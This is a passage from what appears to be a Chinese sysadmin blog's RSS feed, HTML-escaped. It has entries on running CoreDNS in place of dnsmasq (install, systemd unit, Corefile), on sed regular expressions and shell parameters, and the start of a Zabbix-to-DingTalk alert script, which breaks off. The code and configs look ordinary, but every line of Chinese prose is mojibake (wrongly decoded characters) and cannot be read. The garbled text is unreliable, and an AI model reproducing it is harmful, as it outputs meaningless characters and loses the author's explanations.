&lt;p&gt;æ›¿ä»£dnsmasqåï¼ŒåŸºæœ¬dnsmasqçš„åŠŸèƒ½éƒ½æ”¯æŒï¼Œä¿®æ”¹åŠ«æŒåŸŸååä¹Ÿä¸ç”¨é‡å¯ï¼Œä¼šè‡ªåŠ¨åˆ·æ–‡ä»¶æ›´æ–°&lt;/p&gt;
&lt;p&gt;ä¸‹é¢è¯´ä¸€ä¸‹è£…æ³•ï¼š&lt;/p&gt;
&lt;p&gt;å®‰è£…ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget https://github.com/coredns/coredns/releases/download/v1.7.0/coredns_1.7.0_linux_amd64.tgz
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è§£å‹åå°±ä¸€ä¸ªæ–‡ä»¶ï¼Œç›´æ¥æ”¾åˆ°/usr/local/bin&lt;/p&gt;
&lt;p&gt;åšä¸ªsystemdå¯åŠ¨æ–‡ä»¶&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/systemd/system/coredns.service 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Unit&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Description&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;CoreDNS DNS server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;After&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;network.target
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Service&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;PermissionsStartOnly&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LimitNOFILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1048576&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;LimitNPROC&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;512&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;CapabilityBoundingSet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;CAP_NET_BIND_SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;AmbientCapabilities&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;CAP_NET_BIND_SERVICE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;NoNewPrivileges&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ExecStart&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/bin/coredns -conf&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/bin/coredns.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ExecReload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/bin/kill -SIGUSR1 &lt;span class=&#34;nv&#34;&gt;$MAINPID&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;Restart&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;on-failure
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Install&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;WantedBy&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸œè¥¿å…¨éƒ½åœ¨/usr/local/bin/coredns.confé…ç½®æ–‡ä»¶é‡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.:5353 https://.:443 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  any
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  log
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  debug
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nb&#34;&gt;bind&lt;/span&gt; 172.18.30.1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  tls /usr/local/bin/full.pem /usr/local/bin/key.pem
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  hosts /etc/hosts &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ttl &lt;span class=&#34;m&#34;&gt;60&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    reload 1m
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    no_reverse
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    fallthrough
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  cache &lt;span class=&#34;m&#34;&gt;120&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  reload 6s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  loadbalance
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  forward . 114.114.114.114:53 223.5.5.5:53 223.6.6.6:53 &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      policy sequential
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  prometheus 172.18.30.1:9253
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è§£é‡Šä¸€ä¸‹ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>sedä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ç”¨æ³•</title>
      <link>https://rendoumi.com/posts/20221207-sed_regex/</link>
      <pubDate>Wed, 07 Dec 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221207-sed_regex/</guid>
      <description>&lt;p&gt;ä¹‹å‰è¯´è¿‡sedçš„é«˜é˜¶ç”¨æ³•ï¼Œå…¶å®æ™®é€šæƒ…å†µä¸‹ï¼Œæ­£åˆ™æ˜¯æœ€å¸¸ç”¨çš„ï¼Œä¸‹é¢å°±æ¥è¯´ä¸€ä¸‹ï¼Œç”¨ä¸åˆ°çš„å°±æš‚æ—¶ä¸è¯´&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;^ &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…è¡Œå¼€å§‹ï¼Œå¦‚ï¼š/^sed/åŒ¹é…æ‰€æœ‰ä»¥sedå¼€å¤´çš„è¡Œã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…è¡Œç»“æŸï¼Œå¦‚ï¼š/sed$/åŒ¹é…æ‰€æœ‰ä»¥sedç»“å°¾çš„è¡Œã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;. &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…ä¸€ä¸ªéæ¢è¡Œç¬¦çš„ä»»æ„å­—ç¬¦ï¼Œå¦‚ï¼š/s.d/åŒ¹é…såæ¥ä¸€ä¸ªä»»æ„å­—ç¬¦ï¼Œæœ€åæ˜¯dã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;* &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…0ä¸ªæˆ–å¤šæ¬¡å­—ç¬¦ï¼Œå¦‚ï¼š/a*sed/åŒ¹é…æ‰€æœ‰æ¨¡æ¿æ˜¯0ä¸ªæˆ–å¤šä¸ªaåç´§è·Ÿsedçš„è¡Œã€‚åç´§è·Ÿsedçš„è¡Œã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\?&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…0æ¬¡æˆ–1æ¬¡ä»–å‰é¢çš„å­—ç¬¦&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\+&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…1æ¬¡æˆ–å¤šæ¬¡ä»–å‰é¢çš„å­—ç¬¦ï¼Œå¦‚ï¼šç©ºæ ¼\+ æˆ– â€œ\+â€œåŒ¹é…è‡³å°‘ä¸€ä¸ªæˆ–å¤šä¸ªç©ºæ ¼&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#ç®¡é“ç¬¦å·ç”¨æ¥åŒ¹é…ä¸¤è¾¹ä»»æ„ä¸€ä¸ªå­è¡¨è¾¾å¼ï¼Œå¦‚ï¼š&amp;#39;/101\|102/p&amp;#39; åŒ¹é…åŒ…å«101æˆ–è€…102çš„è¡Œæ‰“å°&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…ä¸€ä¸ªæŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚/[sS]ed/åŒ¹é…sedå’ŒSedã€‚  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;^&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…ä¸€ä¸ªä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„å­—ç¬¦ï¼Œå¦‚ï¼š/[^A-RT-Z]ed/åŒ¹é…ä¸åŒ…å«A-Rå’ŒT-Zçš„ä¸€ä¸ªå­—æ¯å¼€å¤´ï¼Œç´§è·Ÿedçš„è¡Œã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\(&lt;/span&gt;..&lt;span class=&#34;se&#34;&gt;\)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…å­ä¸²ï¼Œä¿å­˜åŒ¹é…çš„å­—ç¬¦ï¼Œå¦‚s/\(love\)able/\1rsï¼Œloveableè¢«æ›¿æ¢æˆloversã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# ä¿å­˜æœç´¢å­—ç¬¦ç”¨æ¥æ›¿æ¢å…¶ä»–å­—ç¬¦ï¼Œå¦‚s/love/ **&amp;amp;** /ï¼Œloveè¿™æˆ **love** ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\&amp;lt;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…å•è¯çš„å¼€å§‹ï¼Œå¦‚:/\&amp;lt;love/åŒ¹é…åŒ…å«ä»¥loveå¼€å¤´çš„å•è¯çš„è¡Œã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# åŒ¹é…å•è¯çš„ç»“æŸï¼Œå¦‚/love\&amp;gt;/åŒ¹é…åŒ…å«ä»¥loveç»“å°¾çš„å•è¯çš„è¡Œã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\{&lt;/span&gt;m&lt;span class=&#34;se&#34;&gt;\}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# é‡å¤å­—ç¬¦xï¼Œmæ¬¡ï¼Œå¦‚ï¼š/0\{5\}/åŒ¹é…åŒ…å«5ä¸ª0çš„è¡Œã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\{&lt;/span&gt;m,&lt;span class=&#34;se&#34;&gt;\}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œå¦‚ï¼š/0\{5,\}/åŒ¹é…è‡³å°‘æœ‰5ä¸ª0çš„è¡Œã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;\{&lt;/span&gt;m,n&lt;span class=&#34;se&#34;&gt;\}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# é‡å¤å­—ç¬¦xï¼Œè‡³å°‘mæ¬¡ï¼Œä¸å¤šäºnæ¬¡ï¼Œå¦‚ï¼š/0\{5,10\}/åŒ¹é…5~10ä¸ª0çš„è¡Œã€‚  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¾‹å­å¾ˆå¤š:&lt;/p&gt;
&lt;p&gt;ç”¨æˆ·åï¼Œåé¢è·Ÿ1ä¸ªæˆ–è€…å¤šä¸ªç©ºæ ¼ï¼Œå†è·Ÿå¯†ç ï¼›æ›´æ¢æˆç”¨æˆ·å å¯†ç  MACåœ°å€&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sed -i &lt;span class=&#34;s2&#34;&gt;&amp;#34;s/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; \+&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;IV_HWADDR&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&amp;#34;&lt;/span&gt; &lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;PASSFILE&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è·Ÿ shell è„šæœ¬çš„å‚æ•°ä¸€èµ·è®°æ¯”è¾ƒå¥½ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$0&lt;/span&gt; è„šæœ¬æœ¬èº«çš„åå­—
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt; ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬1ä¸ªå‚æ•°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt; ä¼ é€’ç»™è¯¥shellè„šæœ¬çš„ç¬¬2ä¸ªå‚æ•°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$@&lt;/span&gt; ä¼ ç»™è„šæœ¬çš„æ‰€æœ‰å‚æ•°çš„åˆ—è¡¨
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$#&lt;/span&gt; ä¼ ç»™è„šæœ¬çš„å‚æ•°ä¸ªæ•°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$*&lt;/span&gt; ä»¥ä¸€ä¸ªå•å­—ç¬¦ä¸²æ˜¾ç¤ºæ‰€æœ‰å‘è„šæœ¬ä¼ é€’çš„å‚æ•°ï¼Œä¸ä½ç½®å˜é‡ä¸åŒï¼Œ&amp;gt;å‚æ•°å¯è¶…è¿‡9ä¸ª
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$$&lt;/span&gt; è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$?&lt;/span&gt; å‘½ä»¤æ‰§è¡Œç»“æœåé¦ˆï¼Œ0è¡¨ç¤ºæ‰§è¡ŒæˆåŠŸï¼Œå…¶ä½™æ•°å­—è¡¨ç¤ºæ‰§è¡Œä¸æˆåŠŸã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿˜æœ‰ä¸€ä¸ªé‡è¦çš„åœ°æ–¹ï¼Œsed ä½¿ç”¨ -i å¯¹æ–‡ä»¶è¿›è¡Œä¿®æ”¹æ—¶ï¼Œæ‰§è¡Œè€…éœ€è¦æœ‰å¯¹æ–‡ä»¶ç›®å½•çš„å†™æƒé™ï¼Œå› ä¸ºsedå®é™…æ˜¯äº§ç”Ÿäº†ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œç„¶åå†æŒªå›å»å¾—ï¼ï¼ï¼ï¼&lt;/p&gt;</description>
    </item>
    <item>
      <title>Zabbixä¸‹å‘å¾€é’‰é’‰å‘Šè­¦</title>
      <link>https://rendoumi.com/posts/20221130-zabbix_dingding/</link>
      <pubDate>Wed, 30 Nov 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221130-zabbix_dingding/</guid>
      <description>&lt;p&gt;zabbix æ˜¯å¾ˆç†Ÿæ‚‰çš„ä¸œè¥¿ï¼Œä½†æ˜¯å®é™…ä¸Šåšä¸»å·²ç»è·³è¿‡äº†è¿™ä¸ªä¸œè¥¿ï¼Œç›´æ¥è¹¦åˆ° Prometheus å»äº†&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ï¼Œå­˜åœ¨å³åˆç†ï¼Œå½“ä¸‹å…¬å¸ç”¨çš„æ˜¯è¿™ä¸ªï¼Œé‚£ä¹ˆç”¨å°±ç”¨å§ï¼Œzabbixå‘åˆ°é’‰é’‰å‘Šè­¦ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿç ”ç©¶ä¸€ä¸‹å¦‚ä½•å‘åˆ°é’‰é’‰å‘Šè­¦ï¼Œè€Œä¸”å¥½çœ‹ä¸€äº›&lt;/p&gt;
&lt;p&gt;åŸç†ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åŸç†å°±æ˜¯ç”¨ post å‘é’‰é’‰æœºå™¨äººçš„ webhook åœ°å€æäº¤ Markdown çš„ json ä¿¡æ¯&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;é¦–å…ˆæˆ‘ä»¬è¦å»ºç«‹ä¸ªé’‰é’‰ç¾¤ï¼Œç„¶ååœ¨ç¾¤ä¸­æ·»åŠ ä¸€ä¸ªç¾¤æœºå™¨äººï¼Œè¿™é‡Œå°±ä¼šæœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€ä¸ªæ˜¯è¿™ä¸ªæœºå™¨äººåªæ¥å—ç‰¹å®šçš„è¯è¯­ï¼ŒäºŒæ˜¯å‘æœºå™¨äººå‘é€æ¶ˆæ¯çš„æœºå™¨çš„ipæ˜¯å›ºå®šçš„ã€‚&lt;/p&gt;
&lt;p&gt;é˜¿é‡Œäº‘å»ºè®®çš„æ˜¯å…³é”®è¯ï¼š&lt;strong&gt;äº‘ç›‘æ§ã€äº‘æœåŠ¡ã€ç›‘æ§ã€Monitorã€ECSã€æŠ¥è­¦&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20221130195533865&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221130-zabbix_dingding/image-20221130195533865.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å½“ç„¶ï¼Œè¿™é‡Œæ›´åŠ å»ºè®®IPï¼ŒIPæ˜¯æ­»çš„ï¼ŒæŠ¥è­¦é‡Œå¸¦å…³é”®è¯æ„å‘³ç€å‘é€å†…å®¹è¢«éƒ¨åˆ†å›ºå®šäº†ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä¸Šï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªé’‰é’‰æœºå™¨äººçš„Webhookåœ°å€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://oapi.dingtalk.com/robot/send?access_token&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;xxxxxxxxxx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬è¦å‡†å¤‡ä¸€ä¸ªå‘é€çš„è„šæœ¬ï¼Œpythonå¾ˆåˆé€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#coding:utf-8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#zabbixé’‰é’‰æŠ¥è­¦&lt;/span&gt;
